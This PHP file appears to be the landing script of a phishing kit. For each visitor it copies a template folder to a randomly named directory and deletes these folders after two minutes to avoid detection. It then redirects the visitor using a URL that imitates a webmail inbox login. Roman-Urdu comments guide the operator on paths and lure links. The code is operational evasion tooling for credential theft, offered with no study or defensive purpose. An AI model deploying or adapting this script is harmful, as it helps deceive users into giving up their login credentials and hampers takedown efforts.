<?php

session_start();

include 'delete_function.php';


//+++++++++++++++++// VARIABLES DECLARATION \\+++++++++++++++++\\ 

$random = rand(500,100000000);
$dst    = substr(md5($random), 0, 1000000000);

// SET UNIQUE USER SESSION
$_SESSION["user_id"] = $dst;

$b = base64_encode($random);

$str = rand(); 
$result = hash("sha256", $str);

$src="smoth";

//+++++++++++++++++// VARIABLES DECLARATION END \\+++++++++++++++++\\ 




// is ko change karna mad or pathan ko. Link Work like: index.php?_heavyducati=?smartkawasaki

if($_GET['_']){ exit;}


$now   = time();

if ($handle = opendir('/home/englishp3nicsde/public_html/asdf/')) // bhai yahan full directory deni hai jisy scan kry
{    
    
    $blacklist = array('.', '..', 'check_leave.php','delete_function.php','destroy_session.php','jquery-1.12.0.min.js','index.php', 'tmp_folder','.htaccess', 'smoth', 'any other file?');
    // caution: bhai . or .. remove ni krna $blacklist array sy. warna pichly folders k L lg jain gy.
    while (false !== ($file = readdir($handle))) 

    { 
        if (!in_array($file, $blacklist)) 
        { 

          if ($now - filemtime($file) >= 120) // 120 second. (use 60 * 60 for 1 hours)
          { 

            if(is_dir($file))
            {
              deletefolder($file); 
            }
          }

        }
    }
    closedir($handle);

}







//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
  $dir = opendir($src);
  @mkdir($dst);
  while(false !== ( $file = readdir($dir)) ) 
  {
    if (( $file != '.' ) && ( $file != '..' )) 
      {
        if ( is_dir($src . '/' . $file) ) 
         {
          recurse_copy($src . '/' . $file,$dst . '/' . $file);
         }
        else 
             {
          copy($src . '/' . $file,$dst . '/' . $file);
         }
    }
  }
  closedir($dir);
}



//+++++++++++++++++// CALL FUNCTION \\+++++++++++++++++\\

recurse_copy( $src, $dst );


// REDIRECT TO NEW FOLDER FILES
header("location:".$dst."?Key=".$random."&rand=13InboxLightaspxn.".$random."?$b-&$result");

?>